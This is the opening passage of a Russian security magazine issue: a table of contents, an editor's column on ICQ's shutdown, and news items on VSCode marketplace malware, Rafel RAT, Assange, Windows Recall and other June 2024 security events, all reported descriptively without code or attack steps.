
            № 303
CONTENTS


     Тетя Ася отъехала
   Колонка главреда

    MEGANews
  Самые важные события в мире инфосека за июнь

    Карманный Arch
  Делаем флешку с живым образом Arch Linux

    Кастомный Arch
  Создаем образы Arch Linux для десктопа и Raspberry Pi

    Диета для Arch Linux
  Запускаем Arch на компьютерах с малым объемом памяти

    Файловый титбит
  Учимся менять ресурсы игр на примере «Ядерного титбита»

    Уроки форензики
  Расследуем кражу паролей KeePass на примере HTB Hunter

    Шелл-код Agent Tesla
  Изучаем новые приемы реверса малвари в Ghidra

    Ядерный фаззинг
  Настраиваем Syzkaller для поиска багов в ядре Linux

    HTB Analysis
  Крадем учетки через перехват API приложения

    HTB Pov
  Захватываем веб‑сервер IIS через десериализацию ViewState

    HTB Crafty
  Атакуем сервер Minecraft через уязвимость в Log4j

    HTB Office
  Захватываем домен управления групповыми политиками Windows

    Самооборона без антивируса
  Защищаем Windows своими руками

    JSFuck
  Разбираем уникальный метод обфускации JS-кода

    Замена для WinAPI
  Пишем раннер для шелл‑кода на чистом .NET

    Детект на связи
  Учимся обнаруживать следы атак на EDR

    Титры
  Кто делает этот журнал
HEADER





Вчера, 26 июня 2024 года, произошло зна‐
ковое событие — сервис ICQ прекратил
свое  существование.  Давай  вспомним,
какой была наша «Аська» и как так вышло,
что мы с ней уже давно расстались.                    Андрей Письменный                                                                                      Главный редактор
                                                                                      apismenny@gmail.com

Впервые ICQ появилась в 1996 году. Программу создал израильский стартап
Mirabilis, состоявший всего из пяти сотрудников. Сервис оказался удобным
и быстро набирал пользователей.
  За первые два года его существования номера ICQ имели уже 12 мил‐
лионов человек, что по меркам раннего интернета огромная цифра. Шутка
ли — около 10% от числа всех пользователей. И это без всякого маркетинга!
Люди просто советовали друг другу ставить ICQ, диктовали UIN и радовались
общению.
  В 1998 году, на волне бума доткомов, компанию Mirabilis купила американ‐
ская корпорация AOL, на тот момент крупнейший в США интернет‑провайдер
и владелец множества других сервисов. Были заплачены солидные деньги —
400 миллионов долларов.





                            ICQ 99a

Сложно сказать, как продажа повлияла на судьбу ICQ. С одной стороны, ком‐
панию поначалу не тронули: штаб‑квартира осталась в Израиле, а пятеро
основателей продолжили работать над своим детищем. С другой стороны,
в той же AOL создали прямого конкурента ICQ — AOL Instant Messenger,
или AIM. Именно его и продвигали наиболее активно.
  В начале нулевых годов число зарегистрированных пользователей AIM
и ICQ сравнялось, причем AIM к тому моменту имел более активную поль‐
зовательскую  базу. Но  главным  конкурентом  обеим  программам  стал
выпущенный в 1999 году MSN Messenger, позднее переименовавшийся
в Windows Live Messenger.
  В России это было сложно заметить, но MSN Messenger на пике превос‐
ходил ICQ по популярности в десять раз. Причина успеха та же, что и у Internet
Explorer: MSN поставлялся вместе с Windows. Пользователи, еще не сидев‐
шие на игле Аськиных «а‑ау», решали, что он достаточно хорош.
   Погубила же ICQ вовсе не Microsoft. Виноваты скорее ее конкуренты —
Apple и Google, ведь главным ударом для ранних мессенджеров стало появ‐
ление смартфонов.
   Да, мобильные клиенты ICQ существовали еще в незапамятные времена,
но для новой эпохи они не годились. Возможно, за пеленой ностальгии ты
уже забыл, как изначально работала «Аська», но я напомню. Если человек
не был  онлайн,  написать  ему было  невозможно:  сообщения  просто
не доходили.





                           ICQ 2001b

Дело в том, что общение между клиентскими приложениями происходило
напрямую: получив от сервера Mirabilis айпишники друг друга, они пересы‐
лали все данные уже без его участия (кстати, выяснить IP собеседника было
элементарно, что сегодня кажется диковатым). Соответственно, история
переписки тоже хранилась только локально. Если тебе что‑то написали и это
пришло на включенный компьютер, то, зайдя с телефона, ты этого сообщения
уже не увидишь.
   Вслед за смартфонами появились мессенджеры новой  волны:  Viber,
WhatsApp, Facebook Messenger, Messages из iOS, Telegram и прочие, которые
решали эту проблему. Всего несколько лет, и об ICQ уже мало кто вспоминал.
   «Аська» же в тот момент как раз меняла владельца и переходила от AOL
к российскому фонду Digital Sky и в том же 2010 году досталась Mail.ru Group.
По причинам, которые до сих пор немного загадочны, самыми стойкими
пользователями ICQ стали русские.
   Как‑то так вышло, что MSN нашему человеку казался непонятной забугор‐
ной штуковиной, а вот «Ася» — своей и родной. К 2013 году ICQ продолжало
пользоваться 12 миллионов человек, из них около 8 миллионов жили в Рос‐
сии. Однако и это число стремительно сокращалось. Народ активно общался
через «Вконтакте» и массово переходил либо на WhatsApp, либо на пос‐
леднюю тогдашнюю новинку — Telegram.
   Новости о том, что ICQ активно модернизируют и добавляют все новые
и новые фичи, воспринимались разве что с улыбкой: приятно, конечно, что
«Ася» еще жива, но вы ведь не имеете в виду, что ей всерьез кто‑то будет
пользоваться?





                          Эволюция логотипа

Читая в «Википедии» историю обновлений ICQ, даешься диву: оказывается,
в официальный клиент ICQ еще в 2003 году добавили видеозвонки (я тогда
пользовался не то «Мирандой», не то Pidgin, где их не было в помине).
В 2011 году появилась интеграция с Facebook и  Twitter. В 2016 году
наконец‑то выкатили серверную историю переписки и даже стикеры!
   Успел ли ты отправить кому‑нибудь стикер по ICQ? Я — нет. «Пятизнаки»
и «шестизнаки», альтернативные клиенты, просьбы pisat’ translitom, a to odni
zakoryu4ki, многократные попытки отправить файл и драмы о том, кто когда
был онлайн, — все это теперь история.
   Если хочешь еще немного повспоминать времена, когда «Ася» была
молодой и красивой, я вытащил для тебя из 61-го номера «Хакера» статью
Дмитрия Докучаева «Асечка на  блюдечке». Чур, на  клавиатуру слезами
не капать!
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: Джулиан Ассанж вышел на свободу, в Visual
Studio Code Marketplace обнаружили кучу малвари, рекламу
на  YouTube  пытаются  встроить  прямо  в  видеопоток,
для Raspberry Pi представлен AI Kit, запуск Windows Recall
отложили из соображений безопасности, новые владельцы
polyfill(.)io  могли  скомпрометировать  десятки  миллионов
сайтов, а также другие интересные события июня.





ВРЕДОНОСНЫЙ
VSCODE
Израильские исследователи изучили безопасность Visual Studio Code и в
рамках эксперимента сумели «заразить» больше 100 организаций, создав
клон популярной темы Dracula Official с вредоносным кодом. Дальнейший
анализ VSCode Marketplace и вовсе выявил тысячи опасных расширений
с миллионами установок.
   Visual Studio Code (VSCode) — редактор исходного кода, выпускаемый
компанией Microsoft, который используется разработчиками по всему миру.
Также  Microsoft  управляет  магазином  Visual  Studio Code  Marketplace,
в котором предлагаются расширения, увеличивающие функциональность
приложения и предоставляющие больше возможностей для кастомизации.
  В ходе эксперимента ИБ‑исследователи Амит Ассараф (Amit Assaraf),
Итай Крук (Itay Kruk) и Идан Дардикман (Idan Dardikman) создали расширение,
имитирующее  Dracula   Official —  популярную  тему,  насчитывающую
более 7 миллионов установок в VSCode Marketplace.
   Фальшивое  расширение  использовало  тайпсквоттинг  и  называлось
Darcula,  и  исследователи  зарегистрировали  соответствующий  домен
по адресу darculatheme.com. Этот домен позволил им получить статус про‐
веренного издателя на VSCode Marketplace, что придало подделке убе‐
дительности.





Расширение использовало код легитимной темы Dracula, но также содержало
дополнительный скрипт, который собирал информацию о системе (включая
имя хоста, количество установленных расширений, доменное имя устройства
и информацию об ОС), а затем передавал все это на удаленный сервер
через HTTPS-запрос POST.
   Поскольку эксперимент не преследовал вредоносных целей, аналитики
собрали только опознавательную информацию, а также включили соответс‐
твующее предупреждение в Read Me, лицензию и код расширения.
   Исследователи отмечают, что вредоносный код не обнаруживался EDR-
решениями, поскольку к VSCode зачастую относятся снисходительно.


      «К сожалению, традиционные средства защиты конечных точек (EDR)
      не обнаруживают эту активность. VSCode создан для чтения большого«
       количества файлов, выполнения множества команд и создания дочер-
      них процессов, поэтому EDR не могут определить, является ли эта
      активность   VSCode   нормальной   деятельностью   разработчика
      или признаком вредоносного расширения», — пишет Амит Ассараф.                »
В итоге фальшивое расширение быстро набрало популярность: по ошибке
его установили множество крупных организаций, включая неназванную ком‐
панию с рыночной стоимостью 483  миллиарда  долларов, ряд  крупных
охранных компаний и национальную судебную сеть. Исследователи не стали
раскрывать названия пострадавших организаций.
  Уже после проведения эксперимента специалисты решили изучить другие
угрозы в VSCode Marketplace, используя разработанный ими инструмент
ExtensionTotal,  предназначенный для  поиска потенциально опасных  рас‐
ширений, их распаковки и тщательного исследования подозрительных фраг‐
ментов кода. В итоге они выявили:
 • 1283 расширения с известным вредоносным кодом (суммарно 229 мил‐
   лионов установок);
 • 8161 расширение, связывающееся с жестко закодированными IP-адре‐
   сами;
 • 1452 запущенных неизвестных исполняемых файла;
 • 2304 расширения, использующих GitHub-репозитории других издателей,
   что свидетельствует о том, что это лишь подражатели.

Эксперты предупреждают, что из‑за отсутствия строгих механизмов контроля
и проверки кода в VSCode Marketplace злоумышленники могут беспрепятс‐
твенно злоупотреблять платформой, причем по мере роста ее популярности
ситуация ухудшается.

      «Цифры говорят о том, что в магазине Visual Studio Code существует
      огромное   количество   расширений,   представляющих   опасность«
      для организаций, — предупреждают исследователи. — Расширения
      для VSCode — это вектор атак с нулевой видимостью, которым зло-
       употребляют и который может иметь серьезные последствия и нести
      серьезные   риски.  Эта  проблема  представляет  прямую   угрозу
      для организаций и заслуживает внимания ИБ‑сообщества».                »
Информация обо всех вредоносных расширениях, обнаруженных исследова‐
телями, была передана специалистам Microsoft.
  В ближайшее время исследователи планируют бесплатно опубликовать
ExtensionTotal вместе с подробным описанием его рабочих возможностей.
Инструмент должен помочь разработчикам проверить свои среды на наличие
потенциальных угроз.


У БИРЖИ УКРАЛИ 4502 БИТКОИНА
У японской криптовалютной биржи DMM Bitcoin похитили 4502,9 биткоина, то есть около
308 миллионов долларов по курсу на момент взлома. Это самое крупное криптоограбле‐
ние в 2024 году и восьмое по величине за всю историю наблюдений.

Представители DMM Bitcoin заверили, что все депозиты клиентов в биткоинах будут полностью
обеспечены и пополнены на сумму, эквивалентную похищенной.





RAFEL RAT ПРОТИВ
СТАРЫХ
«АНДРОИДОВ»
Опенсорсная малварь Rafel RAT для Android используется злоумышленниками
для атак на устаревшие устройства, предупредили в компании Check Point.
В некоторых случаях хакеры пытаются блокировать устройства с помощью
вымогательского модуля и через Telegram требуют оплаты выкупа.
   Rafel RAT уже применяется как минимум в 120 вредоносных кампаниях
во многих странах мира (большинство пострадавших находятся в США
и Индонезии, но и Россию эти атаки тоже затронули). За некоторыми из атак
стоят известные хакгруппы, например APT-C-35 (DoNot Team), в то время
как в других случаях атакующие неизвестны, а вредоносная активность исхо‐
дит из Ирана и Пакистана.





В большинстве рассмотренных Check Point атак жертвы использовали старые
версии Android, поддержка которых уже закончилась, так что ОС больше
не получала обновлений безопасности. Так, на Android 11 и старше пришлось
более 87,5% от общего числа заражений. И лишь 12,5% зараженных устрой‐
ств работали под управлением Android 12 или 13.





Что касается брендов и моделей устройств, подвергшихся атакам, среди них
были Samsung Galaxy, Google Pixel, Xiaomi Redmi, Motorola One, а также
устройства OnePlus, Vivo и Huawei. Поэтому эксперты делают вывод, что Rafel
RAT весьма эффективен против множества различных версий Android.
   Троян распространяется разными способами, но чаще всего злоумыш‐
ленники маскируются под известные бренды (включая Instagram＊, WhatsApp,
популярные e-commerce-платформы и антивирусные приложения), чтобы
обманом вынудить пользователей загрузить вредоносные APK.
   Затем во время установки вредонос запрашивает доступ к опасным раз‐
решениям, в том числе разрешение на работу в фоновом режиме, а также
внесение в список исключений, чтобы на малварь не влияла оптимизация
батареи.
   Команды, поддерживаемые Rafel RAT, зависят от конкретной версии мал‐
вари, но наиболее важные из них такие:
 • ransomware — запускает процесс шифрования файлов на устройстве;
 • wipe — удаляет все файлы по указанному пути;
 • LockTheScreen — блокирует экран устройства, делая его непригодным
   для использования;
 • sms_oku — передает все SMS (включая коды двухфакторной аутен‐
   тификации) на управляющий сервер;
 • location_tracker — передает данные о местоположении устройства
   на управляющий сервер.

По данным исследователей, примерно в 10% атак была задействована
команда ransomware, то есть хакеры шифровали файлы на  устройстве
с помощью заранее определенного ключа AES и вымогали выкуп у жертв.
   Если вредонос получил на устройстве права DeviceAdmin, у него появляет‐
ся контроль над важнейшими функциями, включая возможность изменять
пароль блокировки экрана и добавлять на экран произвольное сообщение,
часто представляющее собой записку с требованием выкупа.
   Хуже того, если пользователь попытается отозвать права администратора
у Rafel RAT, малварь может отреагировать сменой пароля и немедленной бло‐
кировкой экрана.
   Аналитики наблюдали несколько операций с использованием Rafel RAT,
в частности атаку из Ирана, в ходе которой перед запуском модуля шиф‐
рования была проведена разведка с использованием других возможностей
малвари.  Так, злоумышленники стирали историю  звонков, меняли обои
на собственное сообщение, блокировали экран, активировали вибрацию
устройства и отправляли SMS с требованием выкупа. Жертве предлагалось
связаться с хакерами в Telegram, чтобы «решить проблему».
   Эксперты напоминают, что для защиты от подобных атак следует избегать
загрузки APK из сомнительных источников, не переходить по URL-адресам
из электронных писем и SMS, а также проверять приложения через Play
Protect перед их запуском.
   ＊Принадлежит компании Meta, чья деятельность признана экстремист‐
ской и запрещена в России.


СКОЛЬКО ЗАРАБАТЫВАЮТ НЕОФИЦИАЛЬНЫЕ СТУДИИ
ОЗВУЧИВАНИЯ
Аналитики компании FACCT изучили рынок и доходы за 2023 год 50 неофициальных студий
озвучки, чьи переводы обычно используют нелегальные распространители видеоконтента.


Невзирая на общее падение рынка онлайн‑пиратства в 2023 году (в целом он сократился
на 16%), активно развиваются студии альтернативного озвучивания, которые формируют вок‐
руг себя собственный рынок. Исследователи связывают это с геополитической ситуацией,
а также большим числом зарубежных сериалов и фильмов, не представленных официально
в России.

Количество озвучек фильмов и сериалов в 2023 году превысило 22 700.

Минимальный  заработок  изученных 50  студий  за  этот  период  оценивается более чем
в 61,6 миллиона рублей.

Одна студия обычно занимается озвучиванием фильмов и сериалов конкретных жанров и стран
производства.  Так,  изученные  студии  распределяются по четырем обобщенным жанрам:
фильмы и сериалы для массового зрителя, дорамы, аниме, а также турецкие филь-
мы и сериалы.





Неофициальные озвучиватели зарабатывают на спонсорских подписках (41,9%), до-
ходах от рекламы и сборов на озвучку (23,4%), рекламных доходах с сайта
(20,5%), донатах (14,2%).





AI KIT ДЛЯ
RASPBERRY
В продажу поступил модуль AI  Kit, предназначенный для Raspberry Pi 5.
Модуль создан совместно с компанией Hailo и содержит нейропроцессор ее
производства, облегчающий работу над проектами, связанными с ИИ, ней‐
росетями и машинным обучением.
   AI Kit представлен в формате карты расширения HAT+ (Hardware Attached
on Top). Новинка построена на нейропроцессоре Hailo-8L (урезанная версия
чипа Hailo-8, анонсированного ранее в этом году). Модуль представлен
в форм‑факторе M.2, то есть его можно легко подключить к HAT+.
   Компания Hailo специализируется на чипах, предназначенных для выпол‐
нения рабочих нагрузок ИИ на периферийных устройствах, например в авто‐
мобилях, умных камерах, а теперь и на Raspberry Pi.





Сообщается, что после подключения AI Kit к Raspberry Pi 5 устройство сможет
выполнять 13 TOPS (триллионов операций в секунду). Это не слишком много
по сравнению с GPU Nvidia или ИИ‑ноутбуками с такими процессорами,
как Intel Lunar Lake, на 40+ TOPS, однако решение получается экономичным
и работает со штатным блоком питания Raspberry Pi на 27 Вт.
  По словам технического директора Hailo Ави Баума (Avi Baum), чип пот‐
ребляет около одного ватта на каждые три TOPS (и не более пяти ватт). А для
обычной нагрузки, вроде обработки видео на 60 FPS в реальном времени,
требуется порядка одного‑двух ватт.
   Что касается софта, последняя версия Raspberry Pi OS автоматически
обнаруживает модуль Hailo, поэтому его сразу могут использовать ОС и соот‐
ветствующие приложения.
   Кроме  того,  Raspberry  Pi  обновила набор  приложений для работы
с камерой. Теперь, к примеру, можно использовать камеру для обнаружения
объектов («Это автомобиль»), семантической сегментации («Эти три объ‐
екта — движущиеся автомобили»), сегментации объектов («Эти три дви‐
жущихся автомобиля — грузовик, красный автомобиль и синий автомобиль»),
определения поз и разметки лиц. При этом подчеркивается, что чип Hailo
можно применять и для задач, не связанных с камерой.
   AI Kit уже поступил в продажу и распространяется через «глобальную сеть
одобренных реселлеров Raspberry Pi» по цене 70 долларов США.
   Руководитель Raspberry Pi Foundation Эбен Аптон (Eben Upton) отметил,
что многие большие языковые модели (LLM) сложно запустить даже на мощ‐
ных ПК, а некоторые работы все равно придется выполнять в облаке. И хотя
пока для AI Kit нет широкого спектра вариантов использования, Аптон ожи‐
дает, что его доступная цена приведет к «экспоненциальному росту» при‐
ложений и решений в области ИИ.





ЗАМЕДЛЕНИЕ YOUTUBE ВЕРОЯТНЕЕ БЛОКИРОВКИ
Зампред комитета Госдумы по информационной политике Антон Горелкин рассказал в своем
Telegram-канале, что вариант с замедлением скорости работы YouTube в России выглядит
более реалистичным, чем полная блокировка сервиса на территории страны.

          «Отлично сегодня подискутировали с экспертами РОЦИТ о судьбе YouTube.→        Сразу скажу, что пока нет ответа на самый популярный вопрос: „Когда его уже
        заблокируют?“ К тому же, скорее всего, регулятор сначала задействует не бло‐
        кировку, а другую ограничительную меру — замедление скорости доступа. И тут
       есть нюанс.
           Законопроект о запрете рекламы на заблокированных ресурсах, который мы
       с коллегами внесли на рассмотрение Госдумы, затронет YouTube даже в случае
       замедления скорости. Это значит, что рекламные интеграции, которыми сейчас
       активно промышляют российские контент‑мейкеры на американском видеохос‐
        тинге, окажутся вне закона. А поскольку вариант с замедлением YouTube пред‐
        ставляется более реалистичным, чем полная его блокировка, этот сценарий
        нужно держать в голове всем, кто вовлечен в эту деятельность», — пишет Горел‐
        кин.





                                     Продолжение статьи →
← Начало статьи





 ДЖУЛИАН АССАНЖ
 СВОБОДЕН
   Основателя WikiLeaks Джулиана Ассанжа освободили из‑под стражи, и он
  покинул тюрьму строгого режима Белмарш, где провел 1901 день. Ассанжа
   освободили в результате сделки, которую он заключил с Министерством
   юстиции США.
     26 июня 2024 года Ассанж предстал перед судом на Северных Мари‐
   анских островах (США), на острове Сайпан, и признал себя виновным
  по одному из 18 пунктов обвинения, а именно в сговоре с целью получения
  и распространения информации, связанной с национальной обороной США.
      Дело в том, что в рамках соглашения после признания вины Ассанжа при‐
   говорили к 62 месяцам заключения, которые он уже отбыл в британской
   тюрьме. Затем  судья  зафиксировал  договоренности  между Ассанжем
  и Министерством юстиции США, после этого дело основателя WikiLeaks было
   официально прекращено, и он направился домой в Австралию.
      Отметим, что остров Сайпан был выбран властями «с учетом несогласия
   обвиняемого ехать в континентальную часть США для признания своей вины
  и близости этого федерального окружного суда США к стране гражданства
   обвиняемого, Австралии, куда, как мы ожидаем, он вернется по окончании
   процесса», — говорится в письме Отдела национальной безопасности
   Министерства юстиции США от 24 июня текущего года.

         «Это результат глобальной кампании, в которой принимала участие
          общественность, борцы за свободу прессы, законодатели и лидеры «
          разных политических кругов, вплоть до Организации Объединенных
         Наций. Все это создало условия для проведения длительных перего-
         воров с Министерством юстиции США, которые привели к заключению
           сделки, пока еще  официально не завершенной. Мы  предоставим
          дополнительную информацию в ближайшее время.
             После более пяти лет, проведенных в камере размером два на три
          метра, в условиях изоляции 23 часа в сутки, Ассанж скоро воссоеди-
           нится со своей женой Стеллой Ассанж и детьми, которые знали сво-
         его отца только из‑за решетки.
            WikiLeaks опубликовала сенсационные истории о коррупции в пра-
          вительстве и нарушениях прав человека, заставив  представителей
          власти отвечать за свои действия. Будучи главным редактором, Джу-
        лиан жестоко поплатился за эти принципы и за право людей знать.
             Теперь, когда он возвращается в Австралию, мы благодарим всех,
          кто поддерживал нас, боролся за нас и сохранял непоколебимую пре-
          данность в борьбе за его свободу.
            Свобода Джулиана — это наша свобода», — пишут представители
          WikiLeaks.                 »
   Напомним, что до заключения в тюрьму Белмарш около семи лет Ассанж про‐
  жил в посольстве Эквадора в Лондоне, где ему предоставили убежище, чтобы
  он мог избежать экстрадиции в Швецию. В Швеции против него были выд‐
  винуты обвинения в изнасиловании, которые он отрицал и которые, как он
   опасался, в итоге будут использованы для его экстрадиции в США.
    В 2019 году власти Эквадора лишили Ассанжа убежища в посольстве,
   аннулировали полученное им эквадорское гражданство и передали британ‐
  ской полиции, после чего он оказался в тюрьме строгого режима, откуда
   много лет противостоял попыткам экстрадиции со стороны США, где ему
   грозило до 175 лет тюремного заключения. Позже в том же году Швеция
   прекратила расследование в отношении Ассанжа.
     Как теперь сообщает Министерство юстиции США, после вынесения при‐
   говора и осуждения Ассанжу «запрещено возвращаться в Соединенные Шта‐
  ты без разрешения».


 45% ПАРОЛЕЙ ЛОМАЮТСЯ ЗА МИНУТУ
    Эксперты «Лаборатории Касперского» проанализировали 193 миллиона паролей, обнаружен‐
   ных в публичном  доступе в  даркнете.  Выяснилось,  что  почти  половину из них  (45%,
   или 87 миллионов) хакеры смогут взломать менее чем за минуту.

    Хуже того, оказалось, что большинство проанализированных паролей (57%) содержат словар‐
   ное слово, что значительно снижает их устойчивость к взлому.

   При использовании наиболее эффективного брутфорс‑алгоритма только 23% (44 миллиона)
   парольных комбинаций оказались достаточно стойкими: на их взлом у злоумышленников
   ушло бы больше года.





 WINDOWS RECALL
 ОТЛОЖИЛИ
   Компания Microsoft отложила запуск ИИ‑функции Windows  Recall, чтобы
  более тщательно протестировать ее перед выходом в виде публичной пред‐
   варительной версии на компьютерах Copilot+.
      Напомним, что Recall представили в мае 2024 года. Функция призвана
  помочь «вспомнить» любую информацию, которую пользователь просматри‐
  вал в прошлом, сделав ее доступной с помощью простого поиска. Так, Recall,
  которую планировали включить по умолчанию на всех новых ПК Copilot+,
   делает снимок активного окна на экране каждые несколько секунд, записывая
   все, что происходит в Windows, будь то просмотр сайтов в браузере, обще‐
  ние в мессенджере или работа с другими приложениями.
      Полученные снимки обрабатываются нейронным процессором (Neural
   Processing  Unit, NPU) устройства и ИИ‑моделью для извлечения данных
  со скриншотов. Затем информация сохраняется в SQLite, и пользователи
  Windows могут искать по истории с помощью запросов на родном языке.
      Исходно релиз  Recall  в  формате  public  preview был  запланирован
  на 18 июня 2024 года, одновременно со стартом продаж первых ПК Copilot+,
  но теперь компания заявила, что откладывает запуск. Ожидается, что «в бли‐
  жайшие недели» функция  станет  доступна  только  ограниченному  числу
  людей, в рамках программы Windows Insider.

          «После получения отзывов о Recall от нашего сообщества Windows
           Insider мы, как обычно, планируем сделать Recall (preview) доступной «
         для всех ПК Copilot+», — сообщили в компании.                 »
   Согласно обновленному сообщению в блоге Microsoft, запуск Recall отло‐
   жили, чтобы привести функцию в соответствие с «высокими стандартами»
   компании в области качества и безопасности.


         «Это решение основано на нашем стремлении обеспечить надежный
        и безопасный опыт для всех клиентов и получить дополнительные «
          отзывы, прежде чем сделать эту функцию доступной для всех поль-
          зователей ПК Copilot+», — добавили в Microsoft.                 »
  Мы уже рассказывали о том, что Recall подверглась жесткой критике как со
   стороны ИБ‑экспертов, так и со стороны защитников конфиденциальности.
   Специалисты сравнивали функцию с кейлоггером, добавленным в Windows,
  и уже демонстрировали, как использовать ее для кражи данных.
    В ответ на эту критику Microsoft сообщила, что обеспечит дополнительную
   безопасность Recall, сделав функцию опциональной и зашифровав БД, чтобы
   та  была  недоступна,  пока  пользователь  не  пройдет  аутентификацию
  с помощью Windows Hello.
      Пока неясно, какие дополнительные защитные меры Microsoft намере‐
   вается встроить в Recall и когда функция будет доступна обычным поль‐
   зователям.


 БЕЗОПАСНОСТЬ МАЛОГО И СРЕДНЕГО БИЗНЕСА

   Специалисты «Лаборатории Касперского» изучили киберзащиту микро-, малых и средних пред‐
    приятий.

  В секторе малого и среднего бизнеса с 1 января по 30 апреля 2024 года выявлено 138 046
   заражений. По сравнению со 131 219 случаями за тот же период 2023 года рост составил более
  5%.

   Самой распространенной угрозой остаются атаки троянов,  особенно замаскированных
   под легитимные приложения.





                   Основные типы угроз, затрагивающих сектор малого и среднего бизнеса

   Чаще всего малварь атакующих имитировала следующие приложения: Microsoft Excel,
   Microsoft Word, Microsoft PowerPoint и Salesforce (в мире), Microsoft Outlook,
   Microsoft PowerPoint и Salesforce (в России).





       Процент уникальных файлов с именами, имитирующими девять самых популярных легитимных при‐
                                                  ложений

    Также серьезной проблемой для малого и среднего бизнеса остается фишинг, который чаще
    всего распространяется через электронные письма и социальные сети.





 УТЕКЛИ ИСХОДНИКИ
 APPLE
   Хакер под ником IntelBroker заявил на BreachForums, что похитил у компании
   Apple исходный код нескольких внутренних инструментов.
      Согласно   опубликованному   злоумышленником   сообщению,   «в
  июне 2024 года у Apple.com произошла утечка данных» (к которой хакер,
   вероятно, причастен), что и привело к раскрытию информации. IntelBroker
   утверждает, что в результате он заполучил исходный код для следующих внут‐
  ренних инструментов компании: AppleConnect-SSO, Apple-HWE-Confluence-
  Advanced и AppleMacroPlugin.





  Об инструментах Apple-HWE-Confluence-Advanced и AppleMacroPlugin извес‐
   тно мало. Зато AppleConnect-SSO — это система аутентификации, которая
   позволяет сотрудникам получать доступ к определенным приложениям в сети
   Apple. Эта система интегрирована с базой данных Directory Services, что
   обеспечивает безопасный доступ к внутренним ресурсам.
      Так, iOS-приложения, предназначенные только для сотрудников, исполь‐
  зуют  AppleConnect-SSO  для  быстрой  и  безопасной  аутентификации.
  AppleConnect служит для сотрудников эквивалентом Apple ID и используется
  для доступа ко всем внутренним системам, за исключением электронной поч‐
   ты. Инструмент интегрирован во множество внутренних сервисов, исполь‐
  зуемых сотрудниками Apple Store, включая Concierge, EasyPay и MobileGenius,
  а также сайты AppleWeb и PeopleWeb.
      Таким образом, предполагаемая утечка явно локализована внутри ком‐
  пании и вряд ли затрагивает данные клиентов Apple.
    В своем сообщении IntelBroker не раскрывает никакой дополнительной
  информации. Судя по всему, он намерен продать предположительно укра‐
   денные у компании данные.
      Напомним, что в последнее время IntelBroker регулярно сливает данные,
  похищенные у целого ряда правительственных учреждений США, включая
   Госдеп, Министерство обороны и армии США, а также Иммиграционную
  и таможенную полицию (ICE) и Службу гражданства и иммиграции США
   (USCIS).
     Кроме того, ранее IntelBroker связывали с другими громкими инциден‐
   тами, включая утечку данных, затронувшую членов и сотрудников палаты
   представителей США (нижняя палата конгресса США), взлом Hewlett Packard
   Enterprise (HPE), утечку данных General Electric, утечку данных разведыватель‐
  ного альянса Five Eye и так далее.
    В прошлом месяце именно IntelBroker заявил о взломе портала Europol
   Platform  for Experts (EPE), утверждая, что похитил у Европола документы
  под грифом «Только для служебного пользования», а также документы,
  содержащие  секретные  данные.  Вскоре  после  этого  хакерский форум
   BreachForums, на котором данные были выставлены на продажу, уже во вто‐
  рой раз попытались закрыть правоохранители, однако вскоре сайт возоб‐
  новил работу.





  30 ИНЖЕНЕРОВ TELEGRAM
   После интервью, которое Павел Дуров дал Такеру Карлсону, эксперты раскритиковали Дурова,
   заявившего, что он — единственный владелец, директор и менеджер по продукту в компании,
   а в целом штат мессенджера составляет всего «около 30 инженеров».
       Специалисты, включая известного криптографа и профессора университета Джонса Хоп‐
   кинса Мэттью Грина (Matthew Green), а также главу по кибербезопасности Electronic Frontier
   Foundation Еву Гальперин (Eva Galperin), говорили, что их настораживает отсутствие сквозного
   шифрования в Telegram по умолчанию, малый штат сотрудников, а также «серверы, которые
   расположены в ОАЭ».

              «Telegram отличается от других (и это намного хуже!) тем, что Telegram — →         не просто приложение для обмена сообщениями, это еще и социальная меди‐
          аплатформа. Как социальная медиаплатформа, он хранит огромное количество
           пользовательских данных. Более того, он хранит содержимое всех сообщений,
          которые не относятся к сообщениям „один на один“ и не были специально (end-
           to-end) зашифрованы. А „тридцать инженеров“ означает, что некому бороться
          с юридическими запросами, нет инфраструктуры для решения проблем со зло‐
           употреблениями и  модерацией  контента», —  заявила  Гальперин  изданию
          TechCrunch.


    Представители Telegram ответили на эту критику и пояснили изданию «Код Дурова», что слова
    главы компании были истолкованы не совсем правильно.

              «Во‑первых, в материале издания (TechCrunch) была допущена откровенная →           ошибка: у Telegram нет никаких серверов в ОАЭ. Представитель мессенджера
            подчеркнул, что никакие данные пользователей там не хранятся.
              Во‑вторых, материал TechCrunch во многом основан на непонимании того,
           что имел в виду Павел Дуров, рассказывая про сотрудников в интервью Карлсо‐
          ну Такеру.
               В‑третьих,  на  самом  деле  за  разработку  и  инфраструктуру  отве‐
         чают  30  человек,  но  основная  команда  при  этом  состоит  примерно
          из 60 человек. Помимо этих 60 членов основной команды, в Telegram есть
           отдельные команды по модерации и борьбе со злоупотреблениями», — заявили
          в компании и пояснили, что команда небольшая намеренно, но включает в себя
           экспертов в различных областях, что помогает быстрее реагировать на ситу‐
          ации, чем в компаниях с большими командами.





 ПАУКИ В VISION PRO
   Разработчики Apple классифицировали недавно исправленную уязвимость
   в Vision Pro как проблему отказа в обслуживании (DoS), однако исследова‐
   тель, обнаруживший эту ошибку, продемонстрировал, что на самом деле
   это более интересный баг.
      Недавно Apple выпустила visionOS 1.2, обновив операционную систему
   своей VR-гарнитуры Vision Pro. Патч устранил сразу несколько уязвимостей,
  но одна из них выделяется тем, что это один из первых багов, который отно‐
   сится именно к этому продукту, а также «первый в истории хак в области
   пространственных вычислений», как заявляет исследователь.
     Проблема, получившая идентификатор CVE-2024-27812, связана с обра‐
   боткой специально созданного веб‑контента. По информации Apple, она
  может привести к отказу в обслуживании. Однако обнаруживший этот баг
   ИБ‑специалист Райан Пикрен (Ryan Pickren) продемонстрировал, что речь
  идет не просто о DoS-проблеме.
      Vision Pro спроектирована таким образом, чтобы предотвращать запуск
   неавторизованных приложений и проникновение в личное пространство
   пользователя.


        «По умолчанию нативные приложения ограничены контекстом Shared
         Space, где они ведут себя предсказуемо и их можно легко закрыть, — «
           рассказывает эксперт. — Если приложение хочет предложить более
         иммерсивный опыт, оно должно получить явное разрешение от поль-
          зователя через подсказку на уровне ОС, что переведет приложение
         в доверенный контекст Full Space».                 »
   Кроме того, сайты, которые пользователь посещает в Safari с помощью Vision
   Pro, могут воспроизводить 3D-объекты в комнате лишь в том случае, если
   пользователь вручную даст на это явное одобрение.
      Однако Пикрен обнаружил, что Apple не применяет тот же уровень защиты
   к ARKit Quick Look — функции iOS, созданной несколько лет назад. Ока‐
